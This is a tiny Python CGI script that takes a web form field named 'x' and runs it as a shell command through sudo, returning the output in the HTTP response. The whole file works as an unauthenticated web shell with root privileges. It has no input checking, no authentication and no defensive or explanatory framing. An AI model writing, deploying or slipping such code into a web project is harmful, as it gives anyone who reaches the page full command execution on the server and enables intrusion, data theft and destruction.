#!/usr/bin/python3

import cgi
import subprocess as sp

print("content-type:  text/html")
print()

form = cgi.FieldStorage()
cmd = form.getvalue("x")
output = sp.getoutput("sudo {0}".format(cmd))
print(output)
